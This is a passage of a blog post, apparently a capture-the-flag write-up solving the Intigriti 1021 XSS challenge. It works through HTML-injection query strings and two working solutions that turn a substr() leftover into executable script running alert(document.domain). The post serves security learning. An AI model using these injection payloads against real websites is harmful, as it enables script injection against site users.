</pre><td class="rouge-code"><pre><span class="p">?</span><span class="n">html</span><span class="p">=&lt;/</span><span class="n">h1</span><span class="p">&gt;&lt;/</span><span class="n">div</span><span class="p">&gt;&lt;</span><span class="n">div</span> <span class="n">id</span><span class="p">=</span><span class="s">"intigriti"</span><span class="p">&gt;&lt;</span><span class="n">script</span><span class="p">&gt;&amp;</span><span class="n">xss</span><span class="p">=</span><span class="n">xss</span>
</pre></table></code></div></div><p>The variable <code class="language-plaintext highlighter-rouge">f</code> will contain the value <strong>“tml&gt;”</strong> after using the <strong>substr()</strong> function to retrieve the last four characters from the variable <code class="language-plaintext highlighter-rouge">i</code>.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_7.png" alt="" data-proofer-ignore></p><p>The final value that can be obtained from <code class="language-plaintext highlighter-rouge">document.createElement("script")</code> as follows.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span><span class="nx">tml</span><span class="o">&gt;</span><span class="p">)]}</span><span class="dl">'</span><span class="s1">xss</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_8.png" alt="" data-proofer-ignore></p><p>Since we can manipulate the 4 characters. There are 2 ways that we can try and what I observe from other references too.</p><ul><li>Make the value stored into a variable. Example: <code class="language-plaintext highlighter-rouge">a=')]}'</code><li>Ensure the value <code class="language-plaintext highlighter-rouge">)]}'</code> will not causing any errors even without storing it.</ul><h3 id="solution-1"><span class="mr-2">Solution 1</span><a href="#solution-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The first solution we want to try store it into a variable. Fortunately, all the tags will automatically close, so we only need to focus on the tags that may contain a single quote (‘). The payload I initially attempted is as follows.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>?html=<span class="nt">&lt;/h1&gt;&lt;/div&gt;&lt;div</span> <span class="na">id=</span><span class="s">"intigriti"</span><span class="nt">&gt;&lt;a</span><span class="err">='</span><span class="nt">&gt;&lt;script&gt;</span><span class="o">&amp;</span><span class="nx">xss</span><span class="o">=</span><span class="nx">xss</span>
</pre></table></code></div></div><p>But we still can’t have the <code class="language-plaintext highlighter-rouge">a='&gt;</code> yet as our 4 characters.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_9.png" alt="" data-proofer-ignore></p><p>When we add another tag before <code class="language-plaintext highlighter-rouge">&lt;a='&gt;</code>, it seems like we manage to get what we want</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>?html=<span class="nt">&lt;/h1&gt;&lt;/div&gt;&lt;div</span> <span class="na">id=</span><span class="s">"intigriti"</span><span class="nt">&gt;&lt;nothing&gt;&lt;a</span><span class="err">='</span><span class="nt">&gt;&lt;script&gt;</span><span class="o">&amp;</span><span class="nx">xss</span><span class="o">=</span><span class="nx">xss</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_10.png" alt="" data-proofer-ignore></p><p>The final payload we just need to add necessary codes to execute our XSS payload <code class="language-plaintext highlighter-rouge">alert(document.domain)</code> using the <code class="language-plaintext highlighter-rouge">xss</code> parameter as follows:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>?html=<span class="nt">&lt;/h1&gt;&lt;/div&gt;&lt;div</span> <span class="na">id=</span><span class="s">"intigriti"</span><span class="nt">&gt;&lt;nothing&gt;&lt;a</span><span class="err">='</span><span class="nt">&gt;&lt;script&gt;</span><span class="o">&amp;</span><span class="nx">xss</span><span class="o">=</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_11.png" alt="" data-proofer-ignore></p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span><span class="nx">a</span><span class="o">=</span><span class="dl">'</span><span class="s1">&gt;)]}</span><span class="dl">'</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><h3 id="solution-2"><span class="mr-2">Solution 2</span><a href="#solution-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In the second solution, our goal is to ensure that our payload does not break the JavaScript code, while also do not need storing the value in a variable. To achieve this, let’s reassess our situation. Assume we have the following code:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
	<span class="p">)]}</span><span class="dl">'</span><span class="s1">
</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>When we run the <strong>HTML</strong> file as shown above, we will encounter an error: <code class="language-plaintext highlighter-rouge">Uncaught SyntaxError: expected expression, got ')'</code>. To address this issue, let’s attempt to add a <code class="language-plaintext highlighter-rouge">(</code> character infront.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
	<span class="p">())]}</span><span class="dl">'</span><span class="s1">
</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Upon making the suggested modification, we will encounter a different error: <code class="language-plaintext highlighter-rouge">Uncaught SyntaxError: unexpected token: ')'</code>. In the given scenario, let’s assume we need to add a tag, such as <code class="language-plaintext highlighter-rouge">&lt;aa&gt;</code>. By doing so, we will obtain a value of <code class="language-plaintext highlighter-rouge">/aa&gt;</code> for the four characters. Now, let’s proceed to add a bracket within this payload.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>?html=<span class="nt">&lt;/h1&gt;&lt;/div&gt;&lt;div</span> <span class="na">id=</span><span class="s">"intigriti"</span><span class="nt">&gt;&lt;nothing&gt;&lt;a</span><span class="err">(</span><span class="nt">&gt;&lt;script&gt;</span><span class="o">&amp;</span><span class="nx">xss</span><span class="o">=</span><span class="nx">xss</span>
</pre></table></code></div></div><p>We will get as follows. Also, we only have this error <code class="language-plaintext highlighter-rouge">Uncaught SyntaxError: unterminated regular expression literal</code>.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span><span class="o">/</span><span class="nx">a</span><span class="p">(</span><span class="o">&gt;</span><span class="p">)]}</span><span class="dl">'</span><span class="s1">xss</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>It appears that the provided expression is being interpreted as a regular expression. Therefore, with the current payload of <code class="language-plaintext highlighter-rouge">/a(&gt;)]}'xss</code>, we need to include another <code class="language-plaintext highlighter-rouge">/</code> at the end to properly close the regular expression. More information on this issue can be found in <a href="https://stackoverflow.com/questions/56526366/how-to-fix-unterminated-regular-expression-literal-error-in-javascript">here</a> . Thus, our final payload will be as follows.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>?html=<span class="nt">&lt;/h1&gt;&lt;/div&gt;&lt;div</span> <span class="na">id=</span><span class="s">"intigriti"</span><span class="nt">&gt;&lt;nothing&gt;&lt;a</span><span class="err">(</span><span class="nt">&gt;&lt;script&gt;</span><span class="o">&amp;</span><span class="nx">xss</span><span class="o">=</span><span class="sr">/;alert</span><span class="se">(</span><span class="sr">document.domain</span><span class="err">)
</span></pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/9_intigriti/intigriti_1021_12.png" alt="" data-proofer-ignore></p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span><span class="o">/</span><span class="nx">a</span><span class="p">(</span><span class="o">&gt;</span><span class="p">)]}</span><span class="dl">'</span><span class="s1">/;alert(document.domain)</span><span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>It was an intriguing challenge that helped me learn many new things!</p><h2 id="references"><span class="mr-2">References</span><a href="#references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li><a href="https://blog.isiraadithya.com/intigriti-1021-xss-challenge-solution-writeup/">https://blog.isiraadithya.com/intigriti-1021-xss-challenge-solution-writeup/</a></ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>ctf</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/intigriti/" class="post-tag no-text-decoration" >intigriti</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Intigriti+-+Challenge+1021+Writeup+-+%24%28H0j3n%29&url=https%3A%2F%2Fh0j3n.github.io%2Fposts%2FIntigriti-Challenge-1021-Writeup%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Intigriti+-+Challenge+1021+Writeup+-+%24%28H0j3n%29&u=https%3A%2F%2Fh0j3n.github.io%2Fposts%2FIntigriti-Challenge-1021-Writeup%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fh0j3n.github.io%2Fposts%2FIntigriti-Challenge-1021-Writeup%2F&text=Intigriti+-+Challenge+1021+Writeup+-+%24%28H0j3n%29" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/ImaginaryCTF-2024/">ImaginaryCTF 2024 [WEB]</a><li><a href="/posts/DownUnderCTF-2024/">DownUnderctf 2024 [WEB]</a><li><a href="/posts/IntigritiCTF-2023-Writeup/">Intigriti CTF 2023 Writeup [WEB]</a><li><a href="/posts/TCP1PCTF-2023-Web-Unsecure/">TCP1PCTF 2023 - Un Secure [WEB]</a><li><a href="/posts/Offensive-Security-Experienced-Pentester-OSEP-Review/">Offensive Security Experienced Pentester OSEP Review</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/certification/">certification</a> <a class="post-tag" href="/tags/flareon/">flareon</a> <a class="post-tag" href="/tags/pwn/">Pwn</a> <a class="post-tag" href="/tags/pwnable-kr/">pwnable.kr</a> <a class="post-tag" href="/tags/intigriti/">intigriti</a> <a class="post-tag" href="/tags/osep/">osep</a> <a class="post-tag" href="/tags/oswe/">oswe</a> <a class="post-tag" href="/tags/webs/">Webs</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HackTM-CTF-2023-Writeup/"><div class="card-body"> <em class="small" data-ts="1676764800" data-df="ll" > Feb 19, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTM CTF 2023 - Writeup</h3><div class="text-muted small"><p> This write-up serves as a personal reference and a tool for me to practice CTF. It includes information and solutions collected from various sources, including challenges that were not solved durin...</p></div></div></a></div><div class="card"> <a href="/posts/TJCTF-2023-Writeup/"><div class="card-body"> <em class="small" data-ts="1685145600" data-df="ll" > May 27, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TJCTF 2023 - Writeup</h3><div class="text-muted small"><p> Welcome to my blog, where I will share a write-up on the web challenges. I am a member of Team M53 from Malaysia, and we participated in the TJCTF 2023 competition this year. Link to archive cha...</p></div></div></a></div><div class="card"> <a href="/posts/TCP1PCTF-2023-Web-Unsecure/"><div class="card-body"> <em class="small" data-ts="1697500800" data-df="ll" > Oct 17, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TCP1PCTF 2023 - Un Secure [WEB]</h3><div class="text-muted small"><p> Link to archive challenges: https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/Web/Un%20Secure Category : Web Web : Un Secure We received a zip file dist.zip with the source c...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/TJCTF-2023-Writeup/" class="btn btn-outline-primary" prompt="Older"><p>TJCTF 2023 - Writeup</p></a> <a href="/posts/Offensive-Security-Experienced-Pentester-OSEP-Review/" class="btn btn-outline-primary" prompt="Newer"><p>Offensive Security Experienced Pentester OSEP Review</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/h0j3n">H0j3n</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/certification/">certification</a> <a class="post-tag" href="/tags/flareon/">flareon</a> <a class="post-tag" href="/tags/pwn/">Pwn</a> <a class="post-tag" href="/tags/pwnable-kr/">pwnable.kr</a> <a class="post-tag" href="/tags/intigriti/">intigriti</a> <a class="post-tag" href="/tags/osep/">osep</a> <a class="post-tag" href="/tags/oswe/">oswe</a> <a class="post-tag" href="/tags/webs/">Webs</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
